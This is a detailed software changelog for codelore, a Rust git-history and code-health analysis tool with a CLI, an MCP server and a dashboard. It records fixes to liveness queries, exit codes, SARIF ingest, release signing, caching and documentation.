- **Historical import graphs no longer carry renamed-away files as phantom nodes.** The date-anchored live-at-timestamp rule treated a renamed-away source path as live forever — a rename writes no deletion row, so at every sample point after a rename the same file appeared under both its old and new names, inflating node counts and diluting propagation cost on the architecture-trend and health-trend timelines and in cycle-origins' bisection. The liveness query now excludes paths a rename retired at-or-before the sample timestamp, era-bounded rather than lineage-folded — the returned names feed historical blob reads, so they must be the names that existed in that era's tree, and a name recycled by a new file comes back to life on its own newer rows. The unit test walks one name through all three epochs: live before its rename, gone after it, and back once recycled.

- **`--output -` means stdout, and `codelore diff` publishes its report atomically.** The README's flagship CI recipe (`codelore diff … --output - >> "$GITHUB_STEP_SUMMARY"`) silently produced an empty step summary: no `-`-as-stdout handling existed, so the markdown went into a literal file named `-` in the working tree — green, wrong, and visible to the next gate run as an untracked change. `-` now streams to stdout for every streaming format in both `analyze` and `diff` (the documented recipes work as written), while the path-based formats (`parquet`, `sqlite`, `spa`) reject it up front instead of writing a file of that name. Routing `diff` through the shared output helper also makes its `--output` atomic — the raw file create it used truncated the previous good report the moment a failing run started writing.

- **Same-second commits now resolve chronologically at every tiebreak.** The ingest documents the convention — gix walks reverse-chronologically, so smaller `rowid` means newer commit — and six query sites violated or ignored it: the coordination-needs author-interleave window visited same-second commits newest-first inside an ascending scan (flipping which author counts as `prev`), cycle-origins and architecture-trend ordered their historical walks the same inverted way, the Kamei sparkline's last-N picked the OLDER of a same-second pair, and two newest-first lookups — the window anchor shared with the `[new_code]` gate, and the SARIF evidence chain — tiebroke on SHA lex order, which the ingest comments call topologically meaningless (it can pick a parent over its child). All six now follow the documented rowid direction; everything stays deterministic, it just stops being chronologically wrong at ties. A seeded test pins two same-second commits whose SHAs sort AGAINST chronology and asserts the newest-first consumers pick the newer one — the exact case every old tiebreak got backwards.

- **The three Tier-1 language dispatchers agree again — an uppercase extension or a `.pyi` stub no longer slips between the scans.** `Tier1Language` (complexity), `CloneLanguage` and `ImportLanguage` are hand-mirrored tables whose comments claim they match; they had drifted twice over. Complexity lowercased before matching while clones and imports matched the raw extension, so `Foo.RS` was scored for complexity and code health yet contributed no clone fingerprints and no import edges — an import-graph node with no outgoing edges reads as *this file imports nothing*, not *this file was not examined*, and nothing disclosed it. Separately, clones alone rejected `.pyi`, so a Python stub was measured and graphed but invisible to clone detection. All three now fold case over `Path::extension` semantics; the dotfile divergence the two extraction styles hid (`.rs` names a file with no extension under `Path::extension`, but carried `"rs"` under the old `rsplit` parse) is resolved deliberately toward std — a dotfile-shaped name gets no language anywhere. Clones accepts `.pyi`: stub functions carry `...` bodies whose fingerprints fall below the node-count floor, so the parity costs no clone noise in practice. A parity test now lives in `imports::language` probing all three dispatchers over mixed-case, dotfile and non-Tier-1 names — the only thing holding hand-mirrored tables together is a test that fails when they drift — with positive pins so it cannot rot into vacuous all-`None` agreement. `CACHE_EPOCH` moves to `schema_v20`: caches ingested under case-sensitive dispatch hold correct-but-incomplete `clones` and `imports` tables for repositories carrying such files.

- **Release signing is now externally visible, and the Action's checksum verification fails closed.** The attestation pipeline was complete and correct — every release archive gets a signed SLSA provenance bundle — but the bundles went only to the attestations API, while asset-based verifiers (OpenSSF Scorecard's Signed-Releases check among them) read release assets and never consult the API: the releases scored as unsigned forever. Each bundle is now published as a `<archive>.sigstore.json` release asset. The trusted signer stays first-party-actions-only — the signing-isolation guard rejected the first draft of this change for adding a shell step beside the token, exactly the enforcement it exists for, so the per-archive renaming lives in the release job, which runs shell anyway and holds no signing permissions. Alongside it, the published GitHub Action stops failing open: a missing SHA256SUMS manifest used to warn and run the binary anyway, though absence is indistinguishable from a 5xx, a proxy, or an adversary serving the archive while dropping the manifest. It now branches on HTTP status — only a 404 (a pre-manifest release) proceeds with a warning; every other fetch failure, and a manifest lacking the archive's entry, refuses to run an unverified binary.

- **The bucketed changes table is built once per key and collapses `change_type` chronologically.** Every bucket-aware analysis in a run re-ran the full `changes` join to rebuild `changes_bucketed` (its sibling lineage view has had a build-once guard for exactly this reason); the guard is keyed on the bucket unit and lineage flag, so a genuinely different bucketing still rebuilds, and the grouping swap invalidates it like the lineage guard. And inside a bucket, `change_type` collapsed by lexicographic `MAX` one line away from a chronological `arg_max` on the sibling column — a file modified then deleted inside one bucket read 'modified' and stayed live under every downstream deletion rule; it now collapses to the chronologically last event. Seeded tests pin the modify-then-delete collapse and the guard's same-key/different-key behavior via a sentinel row.

- **`--calibration` reaches `gate` and `explain`, closing the CLI/MCP asymmetry from the other side.** The MCP twins (`gate_changes`, `explain_file`) thread the corpus artifact while the CLI subcommands did not — `codelore explain <path>` and the MCP `explain_file` printed different corpus percentiles for the same file at the same HEAD under a custom corpus, and that number is what the advisory narrative's citation check grounds against; the gate half additionally fragmented the report cache into two entries for identical work. Both subcommands now accept and thread the flag exactly as `--defect-calibration` already did, and the parity test drives `explain` against a ramp corpus that must move the printed lens away from the embedded world corpus — identical output is exactly the silent-ignore failure it pins.
- **The MCP server validates its repository at startup and accepts `--cache-dir`/`--temp-dir`.** A typo'd repo path in a client config produced a healthy-looking server that failed on every tool call — while both calibration artifacts were already fail-fast validated three lines away; the repository is now opened and HEAD resolved before serving, so the client surfaces the misconfiguration at connect time with the fix named. The server also gains the cache and spill-directory overrides every other fact-store-touching subcommand already had: one resolved cache root replaces eleven per-tool default lookups (an override can no longer miss a tool), and the spill override threads through a shared options base into every tool — calibration artifacts deliberately stay per-handler, so a regenerated artifact still never invalidates the memo of a tool that does not read it.
- **`check` and `gate` keep their verdict on stderr in every mode, as documented.** Text mode printed PASS and WARNING lines to stdout while FAIL went to stderr — `codelore check > log` captured the pass but lost the fail, and `2>/dev/null` did the reverse — and SARIF mode printed no PASS line at all despite the documented promise of a verdict line regardless of format. Every verdict and warning line (including the shallow-checkout notice) now goes to stderr in every mode, matching the FAIL path, the JSON mode that was already correct, and the documented contract, so redirecting stdout captures pass and fail symmetrically while the report document stays clean. A contract test pins the channel across text and SARIF.
- **Exit codes mean what the manual says, on every surface.** The documented contract — 1 for a genuine gate verdict, 2 for a CLI/argument mistake, 3 for a repository problem, 4 for an analysis failure — had drifted at the edges: every `codelore diff` failure exited 1, so CI could not tell a typo'd rev range or a missing git binary from "this PR introduced a finding"; unsupported format×analysis combinations returned four different codes depending on which path caught them, most only after paying the full ingest; and `schema`/`explain` reported an unknown NAME with the analysis-crash code while the parser used 2 for the same mistake one flag over. Diff's failures are now typed (malformed range and identical base/head exit 2, unresolvable revs and git failures exit 3, gate verdicts keep 1); streaming format×analysis combinations are validated before the pre-flight from the same derived table the dispatch reads, all at exit 2 — including parquet's analysis subset, which previously wore the gate verdict's exit 1; and unknown names exit 2 everywhere. Three contract tests pin the table.

- **Dashboard batch: the AI-attribution lens works, Escape closes the drawer, one failing widget no longer silences eight others, shared links carry every view knob, and mouse clicks keep the keyboard in sync.** The AI lens rendered the entire hotspot map as "no data" grey — its field (with `mi`/`mi_rank`) was never copied into the sole metrics literal the circle-pack reads, while the table two panels down showed real percentages for the same files; every colour-lens field is now copied and a browser test drives the exposed builder so a dropped field fails by name. The detail drawer opens non-modally, which gets no platform Escape handling — several comments claimed otherwise from an abandoned modal-mode era — so the document-level Escape directive now exists and is browser-tested. The widget boot loop was the one fan-out without per-widget error isolation (a throw in widget N left every later panel looking like "this repo has no data"); each widget now fails into an in-place note. The share-link hash gains the two knobs it silently dropped (`archGraphLayout`, `archMatrixMode` — a shared fusion-matrix link landed on the structure matrix), and selecting a lens tab by mouse now moves the roving tabindex with it, so Tab lands on the selected tab instead of arrow-activating a silent lens change.

- **Knowledge signals stop counting the dead.** Two liveness holes in the knowledge family: the shared `knowledge_shares` table excluded deletion *events* but not deleted *paths*, so a file deleted years ago kept its pre-deletion contributions and flowed into every consumer — coordination-needs emitted a row per dead file and code-familiarity counted authors who only ever touched deleted files (reviewer credit could re-introduce a dead path even after the authored rows were filtered); and the knowledge-prevalence tile's denominator counted renamed-away source paths as live (a rename writes no deletion row, so the old name's last own event reads live forever) while its numerator was lineage-aware — unlike populations in one ratio. The materializer now drops dead paths at both the contribution and reviewer-credit stages, and the denominator reads the same lineage-aware source as its numerator (with lineage off, both sides consistently use raw paths). Seeded tests pin a deleted path staying out of the shares table beside a live control, and the renamed-away fold under lineage against the documented lineage-off population.
- **`--group-file` with `clone-coupling` or `crossing` is rejected instead of silently returning nothing.** Grouping rewrites change paths (and builds a grouped complexity rollup whose own documentation explains why), but clone and import paths stay raw — so clone-coupling matched raw clone pairs against a coupling map keyed on grouped paths and crossing joined raw import edges against grouped coupling: zero keys matched and both returned an empty result that read as a clean bill of duplication and dependency health. The combination now fails at the CLI boundary (exit 2) the same way function-hotspots already did, with the mismatch named.

- **The gix walker no longer zeroes line counts for text files over 1 MiB.** The diff-size guard claimed to match git's `core.bigFileThreshold` default while sitting at 1 MiB — the real default is 512 MiB — so every text file past 1 MiB (generated parsers, lockfiles, vendored single-file libraries) entered `changes` with zero churn on the production backend while `git log --numstat` counted its lines, silently draining churn, hotspot-velocity, code-health's churn term, and the Kamei size features on exactly the files most likely to be large. The cap now sits at git's actual threshold, so both backends treat the same blobs as binary-like; oversized blobs are rejected via an object-header size probe before their bytes are loaded, so the 512x raise does not raise peak memory for the filtered case, and the NUL sniff still filters genuinely binary content. A differential test generates a ~2.9 MiB text file at test time and pins both backends to identical, nonzero per-file counts — the failure this reproduces is invisible to the suite's aggregate drift band, which is exactly how it survived.

- **`cargo install codelore` works again: the gix family moves to 0.87, leaving the fully-yanked `bisync` crate behind.** Every published version of `bisync` — a transitive dependency reached only through `gix 0.86 → gix-protocol 0.64` — was yanked upstream after the last release, which retroactively broke fresh dependency resolution for the published crate: `cargo install codelore` failed before compiling a single line, while the prebuilt release binaries were never affected. The repository's own gate had already caught the yank (`cargo-deny` runs with `yanked = "deny"`, and the weekly re-verify surfaced it), but the response at the time was a deliberately scoped `deny.toml` ignore, because no gix release had yet escaped the dependency. gix-protocol 0.65.1 has now dropped `bisync` entirely, so the bump both restores the source-install path and lets that ignore be deleted per its own written deletion condition — the `yanked = "deny"` posture is back to covering the whole tree with no exceptions. Worth recording for anyone hitting the broken window before the next release: `cargo install --locked codelore` works throughout it, because the `.crate` packaged at publish time carries a `Cargo.lock` pinning `bisync 0.3.0`, and yanked versions remain downloadable for pre-existing lockfiles — yanking only blocks fresh resolution.

- **The two at-rev scans that still paid the cold per-blob path now use the warm per-worker reader.** `Repo::blob_reader_at` exists because `read_blob_at` re-resolves the rev and re-decodes its root tree on every call from a cold object cache, and the at-rev import scan adopted it with a comment naming the per-call path as "the worse offender" — but its sibling in the same feature, `ingest_complexity_at_rev`, kept `map_init(|| ())` and the cold call, repaying rev-resolution and root-tree decode once per file per sampled revision on every `health-trend`/`architecture-trend` timeline and every defect-calibration validation pass. `effort_exposure`'s window-start baseline had the same shape in serial: one cold `read_blob_at` per red file, all at the same rev, in two separate loops. All three sites now hoist one warm reader (per rayon worker in the parallel scan, per pass in the serial loops). Byte-identical by construction: the warm reader's equivalence with `read_blob_at` — every path kind, old revs included — is already pinned by a dedicated unit test on the reader itself.

- **The MCP server's `--defect-calibration` now reaches every tool whose result embeds code-health scores.** The server resolves the calibration artifact once at startup, and `check_gates`, `explain_file`, `change_context` and `gate_changes` thread it into their analyses — but `code_health`, `refactoring_targets` and `finding_hotspot_overlap` built their `Options` from defaults, so those three tools scored with the built-in smell weights no matter what the server was started with. The sharpest consequence was within-session inconsistency: an agent calling `code_health` to triage and `check_gates` to verify compared two different weight regimes for the same repository on the same server, and the MCP `code_health` result silently diverged from `codelore analyze --analysis code-health --defect-calibration` on identical state. All three now thread the server's artifact and `--allow-foreign-calibration` exactly as `check_gates` does, and the two memoized tools fold the artifact's content identity into their memo keys the way `explain_file` already did, so a regenerated artifact cannot serve a stale score without moving HEAD. The other four analysis tools are deliberately untouched: `repo_overview`, `hotspots`, `delta_health` and `function_xray` never read the artifact (only the code-health pass consumes the weights), so threading it there would invalidate their memos on artifact regeneration for no observable difference. The regression test runs two servers over one deliberately worsened fixture — default weights against a value-permuted artifact — asserting the file set agrees and at least one structural risk moves; identical outputs are exactly the silent-ignore failure this pins.

- **A clones or imports scan that read almost nothing no longer reports a clean bill of health.** The HEAD complexity pass learned to separate "no row was owed" from "a row was owed and lost", and to warn when coverage falls below 90%. Its two sibling passes did not, and for `clones` the consequence runs the wrong way: `disallow_clone_type_1` is `COUNT(DISTINCT clone_group_id)` and passes on zero, so a scan that failed to read the repository produces exactly the same verdict as a repository with no duplication — the gate reads a broken scan as an improvement. `imports` has the same shape feeding `max_dependency_cycles` and the architecture-violation gates, where an empty graph is indistinguishable from a codebase with no dependencies. All three passes now share one `ScanOutcome`/`ScanCoverage` accounting, and each warns once in aggregate naming the pass, the fact table that went thin, and the dominant failure reason.
  Lifting the abstraction was deliberately deferred until there was a second consumer, which is the repository's own convention, and the classification it carries is unchanged: outcomes are split by the per-file log level each pass already used, so the `debug!` cases (a path `changes` carries that HEAD no longer tracks, a file over the AST size cap) stay out of the denominator and only the `warn!` cases count as lost. Counting routine skips as losses is the mistake that once put this repository at 86% and fired the warning on a scan that had failed at nothing.
  One case needed care in the other direction. A file that is read and parsed successfully but declares no imports — most files, in most repositories — used to return the same `None` as a failed blob read. It is now `Scored` with an empty payload: fully covered, contributing no rows, with the drain filtering empties one stage later than the classifier. Routing it to "not counted" instead would have shrunk the denominator and made coverage read *better* the more import-free files a repository has, reproducing one level up the exact blindness the accounting exists to remove. A test pins that semantic, and another pins that the tally stays payload-agnostic, since the three passes carry three different payload types through it.
  No ingested fact changes: the rows written to `complexity_metrics`, `clones` and `imports` are the same before and after, which the cache suite's whole-fact-store digest confirms. The clones pass gained a second method along the way — the additions pushed `populate_clones_at_head` one line past the `too_many_lines` ceiling, and the honest response to a 101/100 lint is to take the seam it points at rather than silence it, so writing the rows is now its own function and the primary-key deduplication rationale about minified bundles lives next to the code it explains.

- **`delivery-friction` is rename-aware, like every other path-aggregating analysis.** Its per-file revisions, lead-time percentiles and WIP age aggregated `FROM changes` grouped by raw path, so a renamed file split its friction history at the rename: the old path's revisions stopped counting (dead at HEAD) and the new path started from one. The analysis already routed its complexity axis through the shared grouped-complexity dispatcher — the churn axis simply never opted into the lineage rewrite its siblings use. It now materialises the lineage view and routes through `lineage::rewrite`, exactly the `stale-code` shape: canonical-lineage runs (the default) read `changes_lineage`, while `--no-canonical-lineage` and `--code-maat-compat` keep the raw table. Output moves only for repositories whose flagged files carry renames in their history.

- **`codelore check` now describes HEAD on a dirty tree, as its documentation has always said it does.** `advanced-usage` states the three gate surfaces are non-overlapping — `check` gates the committed tree at HEAD, `gate` gates the uncommitted working tree, `diff` gates a rev range — but `check`'s DRY biomarker was counted by fingerprinting the live working tree. Every other input to a health scan (complexity, imports, churn, coupling) reads the fact store and therefore describes HEAD; clones were the single input that disagreed, so on a dirty tree `check` reported a mixed snapshot and duplication you had written but not committed counted against the committed tree. The cause was one field: `HealthScanCtx::head()` — a constructor whose name and doc comment both say HEAD — set `clone_source: CloneSource::WorkingTree`. It now sets `CloneSource::Head`, reading the `clones` table the ingest populates unconditionally from HEAD blobs. As a side effect the flagship analysis stops re-walking and re-parsing every Tier-1 file at analysis time on every invocation, cache hit included.
  The blast radius was checked rather than assumed, because the default feeds eleven production call sites. Every surface that deliberately wants working-tree duplication already said so explicitly and is untouched: the gate *projection* in `change_set.rs` (which needs to see uncommitted duplicates, and whose HEAD-faithful baseline already used `CloneSource::Head` so the two do not cancel), plus `health_trend` and `defect_calibration::validate` — all three build the context as a full struct literal with no `..head()` spread, and the latter two disable clones entirely. `codelore diff` is unaffected for a subtler reason: `analyze_at_rev` points `repo_path` at a throwaway worktree checked out at the rev, so *both* clone sources describe that rev. Two callers were actively contradicting themselves and are fixed by the same line: `check`, per the docs above, and `calibrate-defects`, whose call is labelled "HEAD code-health scan" while feeding a committed calibration artifact — uncommitted edits could have been baked into shipped quantiles.
  Byte-identical wherever the tree matches HEAD, which is the normal state of every surface except the gate projection, and that equivalence ships as a test rather than a claim: one scan per clone source over a fixture whose worktree is byte-identical to HEAD, asserting path, score, band and cognitive agree row by row, with an anti-vacuity guard because an empty result set would satisfy any comparison. A second test pins the default itself, since the equivalence test compares two explicit contexts and would keep passing if the default silently reverted. Users who want the old reading have the surface built for it: `codelore gate` reports uncommitted duplication against HEAD.

- **`is_shallow` now answers identically from both repository backends.** The trait documents the method as a hint with a `false` default so backends without a cheap check can opt out — but `GitCliRepo` has one: `git rev-parse --is-shallow-repository`, which also handles linked worktrees where the grafts file lives in the shared common dir. It now mirrors `GixRepo`, and the differential suite gains the missing coverage: a `--depth=1` clone (through a `file://` URL, since git silently ignores `--depth` on plain local-path clone sources) must read shallow from both backends, and the full-clone fixture must not from either. This was the one hint method with no cross-backend test; the test oracle now answers the shallow-checkout gate warning the same way the production backend does.

- **A SARIF file that is valid JSON but the wrong shape can no longer erase a good scan's findings.** `ingest-sarif` read a run's `results` with `run["results"].as_array()` and skipped the run on `None`, which collapsed two very different documents into one silent path: a run that legitimately found nothing, and a run whose `results` was an object, string or number because something upstream produced a malformed file. The engine name is registered before `results` is read, so either one reaches the caller's seed-empty-batches step and then `replace_engine(engine, &[])`, whose first statement is an unconditional `DELETE FROM external_findings WHERE engine = ?`. That deletion is correct and deliberate — it is how a clean re-scan drops findings you have since fixed — which is exactly what made the conflation dangerous: a document the parser could not understand took the identical path, wiped the engine's stored rows, and left `max_findings_in_hot_files` reporting `skipped` on zero findings with `fail_on_skipped` defaulting to false. Silent data loss followed by a green gate. The three cases are now distinct. Absent or `null` is a clean scan, because SARIF 2.1.0 marks `results` optional and a run that found nothing may omit it; `[]` is the same scan spelled explicitly; present-but-non-array is an error naming the type it found, matching this file's existing treatment of a non-array `runs`. Because every input file is parsed before any `replace_engine` call is made, a bad file in a multi-file ingest aborts the whole run rather than partially deleting. Two of the three tests are anti-vacuity controls: the reported fix was to error on a missing `results` too, and doing that would have satisfied the malformed-input test while breaking the clean-re-scan path this deletion exists to serve.

- **A bare `cargo test -p codelore-lib` compiles again — and `paths_filter` has its first direct tests.** Twelve unit-test modules called `tempfile::tempdir()` under a bare `#[cfg(test)]` while `tempfile` is an optional dependency of the `test-support` feature, so the documented featureless invocation failed to compile before running anything; the two modules that had it right (`analyses::clones`, `external::store`) now share their gate with all twelve. And the combined ignore matcher — load-bearing for the cache key, since `.gitignore` and `.git/info/exclude` decide what reaches `changes` — had no unit tests at all: its three ignore-file sources, negation, ancestor-directory rules, the `--include-ignored`-does-not-neuter-`--exclude` boundary, and `is_git_metadata`'s first-component semantics were exercised nowhere. Six tests now pin them directly.

- **A finding that merely moved is no longer reported as a new finding.** `ingest-sarif` resolved a result's identity by reading `partialFingerprints` before `fingerprints`, inverting what SARIF 2.1.0 specifies: `fingerprints` is the tool's authoritative stable identity — "a stable value that can be used by a result management system to uniquely identify a result over time, even if a relevant artifact is modified" — while `partialFingerprints` are partial contributions a result management system is expected to combine with other information. When both are present the spec says prefer the former. The cost was not cosmetic, because Semgrep emits both: `primaryLocationLineHash` is positional and changes when surrounding code moves, whereas `matchBasedId/v1` is built from the rule pattern with its metavariables substituted and survives code motion. Taking the line hash meant an unchanged finding that shifted down a file arrived carrying a new fingerprint — and since the store is keyed `(engine, fingerprint)`, that inserted a second row rather than upserting the first, so a gate counting findings read a pure move as a brand-new finding. The chain now reads `fingerprints` → `primaryLocationLineHash` → any other partial → self-hash; the module documentation, which still described the old order, is corrected alongside it. Two tests cover the change: one asserting the authoritative value wins when both families are present, and an anti-vacuity counterpart asserting the partial value is still used when it is the only one available — without which the first would also pass for a parser that ignored partials entirely.

- **The crate users actually install no longer advertises a broken documentation link.** `codelore` is binary-only — no `[lib]`, no `src/lib.rs` — so rustdoc has no library target and its docs.rs build reports failure by design, which is what `docs.rs/crate/codelore/latest/status.json` returns today. With no `documentation` key, crates.io falls back to exactly that failed build. It now points at the published user guide instead. This was never a docs.rs problem to fix; the destination was simply wrong. `codelore-lib` and `codelore-rca` both build cleanly and keep their docs.rs pages. Separately, `codelore-lib` gains a `[package.metadata.docs.rs]` block whose only purpose is to state a constraint at the place someone would violate it: **never set `all-features = true`**. The `spa` feature makes `build.rs` fetch vendored assets from a CDN, and docs.rs blocks network access for every crate permanently — it is the one sandbox limit they will not raise. Today the build passes only because `default = []` keeps `spa` off, so a reflexive `all-features = true` (the standard first move when a module is missing from rendered docs) would convert a passing build into one that can never succeed.

- **Editing `.git/info/exclude` no longer serves a stale cache, and a dirty working tree no longer forces a full re-ingest on every run.** These are one change because the ordering between them is load-bearing. `paths_filter` builds its matcher from three files — `.gitignore`, `.git/info/exclude` and `.codeloreignore` — and the ingest consumer applies it to every change row, so all three decide what reaches `changes`, `complexity_metrics`, `clones` and `imports`. Only `.codeloreignore` was hashed into the cache key. `.git/info/exclude` is the sharper omission: it is **untracked**, so editing it moves neither `head_sha` nor the worktree's dirty flag — add a pattern to it, re-run on a clean tree, and you got a cache hit serving the pre-edit file set with no warning. `.gitignore` had the identical gap but was masked, because it is tracked and so its edits dirtied the tree, where the cache-write skip caught them by accident. Both files are now content-digested alongside their sibling. With them in the key, the dirty-tree skip is no longer load-bearing and is gone: it was justified by HEAD-time metrics being read from disk at ingest time, which stopped being true when every HEAD pass moved to `Repo::blob_reader_at("HEAD")`, and it cost a complete re-ingest on every invocation for anyone with uncommitted work — the normal state of the edit-and-gate loop the agent surfaces exist to serve. Removing the skip before hashing the ignore files would have unmasked the `.gitignore` half rather than fixing anything, which is why the two land together. The cache-hit warning was rewritten for the same reason: the fact store now describes HEAD correctly rather than staleley, and the real caveat is a mixed snapshot — analyses that walk the working tree at analysis time describe your edits while everything fact-store-derived describes HEAD. The pinned cache-key classification test was regenerated, which is the deliberate, reviewed reclassification its own comment reserves that for; existing cache entries orphan naturally because the key gained two fields.

- **The HEAD complexity scan now discloses how much of the repository it actually covered.** Every eligible file the scan could not score was previously logged per-file and then discarded, so a scan that reached 200 of 5,200 files was arithmetically indistinguishable from a small repository. Outcomes are now split by whether the scan *owed* a row: a `README.md` is supposed to score nothing, whereas a `.rs` file whose blob will not read is a file the scan owed the user and could not deliver. Two outcomes count as lost coverage — a blob-read failure and a parse error. Three do not: a non-Tier-1 file, a path that `changes` carries but HEAD no longer tracks (`live_paths` is derived from history, so a file deleted before HEAD is legitimately absent), and a file past the AST size cap, which exists precisely to skip generated and minified files. Only the first two are counted in the denominator, so a healthy repository does not read as degraded. The split follows the per-file log level the scan already used — the two `warn!` cases are losses, the two `debug!` cases are routine — which was the existing classification and the authority on the question. The first version of this ignored that and counted every non-scored file as a loss; it put this repository at 349/404 (86%) and fired the warning on a scan that had failed at nothing, which its own self-gate run surfaced within hours. Below a 90% floor the run emits one aggregate `warn!` naming the proportion and the dominant failure mode. The message names the cause that motivated this: a **blobless partial clone** (`git clone --filter=blob:none`, or `actions/checkout` with a filter) has complete commit history and no `.git/shallow`, so the existing shallow-clone check never fires, the commit count is full, the non-emptiness witness passes — and every blob read still fails. Seventeen analyses read `complexity_metrics`, so this is the input to `code_health_min`, `max_red_effort_pct`, `corpus_percentile_max`, `max_propagation_cost` and `max_dependency_cycles`. This change makes the loss *visible*; wiring it into the `degraded` gate verdict is tracked as a follow-up finding, because the honest denominator there is the scan's own eligible set rather than the HEAD tree — `query_live_paths` derives from `changes ⋈ commits`, so a HEAD-tree denominator would fire spuriously under `--after`/`--before`.

- **The pinned build toolchain moves to 1.96.1, which fixes a miscompilation present in every shipped artifact.** Rust 1.96.1 fixes a miscompilation in a MIR optimization, three CVEs in the libssh2 compiled into Cargo, and missing retries/timeouts in Cargo's HTTP client. The pin sat on 1.96.0, so all five release binaries, the container image, and the Homebrew bottle were built by a compiler with a known miscompilation fix available. Ten sites move: `rust-toolchain.toml`'s channel and nine `dtolnay/rust-toolchain` action invocations. The MSRV fields are deliberately **not** touched — `rust-version` and `clippy.toml`'s `msrv` are minor-granularity (`1.96`) and carry no patch meaning, so the floor promised to consumers is unchanged. The bump stops at the patch release rather than moving to current stable: 1.97/1.98 add roughly five newly-hard-failing pedantic lints plus the 1.97 `linker_messages` lint to a `-D warnings` workspace, which is a deliberate piece of work rather than a security fix.

- **Two files claimed the other one maintained the container base-image digests; neither does.** `.github/dependabot.yml` stated that digests are handled by Renovate, while `Containerfile` directed readers to "the Dependabot docker stanza in `.github/dependabot.yml`" — a stanza that does not exist and could not work, since Dependabot's `docker` ecosystem matches only `Dockerfile` / `*.Dockerfile` and skips the OCI-canonical `Containerfile`. `renovate.json` does configure the manager that reads it, but the Renovate app is not installed on the repository, so that config has never run and no bot has ever opened a digest-bump PR. Both comments now say so plainly and name the manual procedure. Installing the Renovate app is what closes it, and would also cover `rust-toolchain.toml` through Renovate's native `rust-toolchain` manager — the detection gap that let the pinned toolchain sit on a superseded patch release.

- **`codelore profile` no longer advertises a C++ grammar the binary cannot parse, and `codelore-rca`'s crates.io page no longer pins four grammars it does not have.** The unreachable-grammar excision removed C++, Kotlin and the two Mozilla helper grammars, and its own narrative is accurate — what it did not do was sweep for other text asserting the state it had just changed. Seven claims survived it, and the two that matter most are not comments. `codelore profile` is the command a user runs to learn what the tool is built from, and it listed C++ among the pinned tree-sitter grammars; the product dispatches six parsers over five languages and none of them is C++. `UPSTREAM.md` is set as `readme` in `codelore-rca`'s manifest, so its grammar-version table *is* the published package page, and it still carried rows for `tree-sitter-kotlin-ng` and the three `bca-tree-sitter-*` grammars plus a paragraph routing C++ through a `get_language!` macro arm that was deleted — inside a section written as present-tense guidance for the next person upgrading a grammar. The remaining five: a layout note describing a `macros.rs` reference to the mozcpp grammar that is gone, and promising work "to be resolved" that has been; `import_graph.rs` explaining that it avoids `petgraph` because of a version conflict that ceased to exist when `petgraph` left the workspace entirely; the roadmap asserting the `leiden-rs` `petgraph` feature is off *solely* over that conflict, contradicting the manifest comment the same commit wrote saying the opposite; the excision narrative in `UPSTREAM.md` making that same *solely* claim a second time, on the published page; and a manifest comment introducing a `dirs` declaration that a later commit deleted from directly beneath it. Every one of these survives a build, which is the point — the removals were verified by building, and that is the right method, but a compiler cannot see prose. The seventh is the sharpest: it was found not by the sweep but by a cleanup review *of the sweep's own fix*, sitting twenty lines from a paragraph that fix had already rewritten, which is why the accompanying report no longer claims a stale-prose sweep can be declared complete.

- **The convention banning plan markers and version numbers from comments now holds in the manifests and on the crates.io page, where nothing was enforcing it.** The comment-hygiene guard scans `.rs` and `.sql` under the two product crates' `src`/`tests`, so a `Cargo.toml` is outside it twice over — by extension and by path, since manifests sit at crate root. No guard reads `crates/codelore-rca/UPSTREAM.md` at all, and that crate's manifest sets it as `readme`, which makes it the published package page. A census across every manifest and the published markdown found seven marker sites: a spec-section reference plus three version numbers on the workspace PGO profile, a plan number on `codelore-lib`'s grammar block, a finding ID and a tier/day marker on `clap_complete`, a spec-section reference on `codelore-rca`'s tree-sitter pin, and — on the crates.io page — a section *titled* after a plan step, a second plan-step reference, and a third spec-section reference. All now describe the current contract instead. The guard gap stays open and tracked, with its axis corrected: the finding had read it as extension-and-path, but the file that mattered most was missed on a different axis entirely, published versus internal.

- **A quotation that was carrying an argument no longer carries words its source never used.** The `cargo-machete` rejection grounds itself in this repository's own zizmor precedent and quoted it as *"a check that is red for the wrong reason teaches people to ignore red checks."* The precedent says *red on every pull request*: the substitution swapped a criterion about volume for one about correctness, with the quotation marks left in place, and the swapped criterion was then load-bearing for the rejection. The original applies to a machete gate on its own terms — five false positives make it red on every pull request until they are suppressed — so the accurate quotation is also the stronger argument. Alongside it, the stale-claim class is now closed by a stated rule rather than by a count: prose that gives present-tense guidance gets swept, prose that records what was believed at a point in time does not, which is why an eighth instance in a released changelog section is deliberately left standing. The `num-traits` mechanism, previously re-synchronised across two `[Unreleased]` entries rather than deduplicated, is stated once. `centrality.rs` no longer measures itself against a crate that has left the workspace, nor links it as a live alternative. And `leiden-rs`'s feature choice is no longer explained on a different crate's published page, where it had already gone stale twice — the reason of record lives beside the dependency it governs.

- **`codelore-rca`'s docs.rs page no longer advertises six languages the crate cannot parse.** The crate rustdoc was inherited verbatim from upstream `rust-code-analysis` and listed eleven: C#, CSS, Go and HTML were never vendored into this fork, while C++ and the Firefox-internal JavaScript dialect left with the unreachable-grammar excision. It also routed bug reports to Mozilla's issue tracker, which cannot act on them. The block now names the five languages the fork parses — Java, JavaScript, Python, Rust, and TypeScript including TSX — states which upstream entries do not apply and why, and points at this repository. `UPSTREAM.md` records the divergence, because a fork that documents every other deviation from upstream should not make this one silently. Of everything the excision left behind this had the widest audience and the lowest cost: a doc comment, no type or signature touched, not a breaking change under the Cargo semver rules. A peer fork of the same upstream currently ships the identical wrong list on its own docs.rs page, which is what happens when nobody edits an inherited `//!` block.
...
- **A narrative quoting the corpus-percentile confidence interval is no longer stamped uncited.** The fact sheet prints `corpus_percentile_ci` as a single `lo–hi` string, and the citation set kept only values that parse whole as one float — so both printed endpoints were invisible to the check, and a model that quoted the interval exactly as the sheet renders it was flagged for it. An external 612-run field study over six foreign repositories measured the cost: roughly four of five flagged narratives carried at least one such endpoint token, the single largest over-flagging route in real output. Composite en-dash values now contribute both endpoints to the fact-value set, and warm-cache narratives heal immediately because the stamp is recomputed from the cached text on every read. The interval's confidence level (`95%`) is still not a printed sheet value and still flags — the check grounds what the sheet prints, nothing more. The labelled corpus, its CI gate, and the evidence doc move together: two `fp-ci-bound` entries reclassify to `clean` (TN 18, FP 17 of 59), and the class narrows to the confidence-level residue.

